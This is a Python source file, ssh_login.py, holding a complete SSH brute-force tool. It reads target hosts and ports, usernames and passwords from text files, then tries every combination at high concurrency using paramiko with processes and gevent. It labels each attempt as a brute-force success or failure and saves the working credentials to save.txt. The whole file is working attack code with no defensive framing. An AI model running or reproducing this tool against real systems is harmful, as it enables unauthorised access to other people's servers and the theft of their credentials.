#@author:九世
#@time:2019/11/3
#@file:ssh_login.py

from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
import asyncio
from colorama import Fore,init
from dataclasses import dataclass
import gevent
import paramiko

init(wrap=True)

@dataclass
class Ssh_login(object):
    calc:int=0
    calc2:int=0
    hosts={}
    names=[]
    pwds=[]
    djcs=[]
    xcs=[]
    ybs=[]

    def login(self,payload):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=payload['host'],port=int(payload['port']),username=payload['username'], password=payload['password'], timeout=15)
            ssh.close()
            print(Fore.GREEN+"[+] "+Fore.WHITE+"爆破成功 host:{} username:{} password:{} port:{}".format(payload['host'], payload['username'], payload['password'], payload['port']))
            print("爆破成功 host:{} username:{} password:{} port:{}".format(payload['host'], payload['username'], payload['password'], payload['port']),file=open('save.txt','a',encoding='utf-8'))
            self.ybs.append(payload['host'])
            ssh.close()
        except Exception as r:
            print(Fore.RED+"[-] "+Fore.WHITE+"爆破失败 host:{} username:{} password:{} port:{} Error:{}".format(payload['host'], payload['username'], payload['password'], payload['port'],r))
            pass

    def read_file(self,file):
        dk=open(file,'r',encoding='utf-8')
        for d in dk.readlines():
            data="".join(d.split('\n'))
            yield data

    def xc(self,rw):
        for data in rw:
            self.xcs.append(gevent.spawn(self.login,data))

        gevent.joinall(self.xcs)
        self.xcs.clear()

    def djc(self):
        hun={}
        for y in self.hosts:
            for v in self.names:
                for c in self.pwds:
                    hun['host']=y
                    hun['port']=self.hosts[y]
                    hun['username']=v
                    hun['password']=c
                    if self.calc==100:
                        p=Process(target=self.xc,args=(self.djcs,))
                        p.start()
                        self.calc=0
                        self.djcs.clear()

                    self.djcs.append(hun)
                    self.calc+=1
                    hun={}

        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,))
            p.start()
            self.calc = 0
            self.djcs.clear()

    async def yb(self,hosts,users,passwds):
        for h in self.read_file(hosts):
            data=str(h).split(":")
            self.hosts[data[0]]=data[1]

        for u in self.read_file(users):
            self.names.append(u)

        for p in self.read_file(passwds):
            self.pwds.append(p)

        self.djc()

if __name__ == '__main__':
    obj=Ssh_login()
    loop=asyncio.get_event_loop()
    tk=loop.create_task(obj.yb("host.txt","user.txt","pwd.txt"))
    loop.run_until_complete(tk)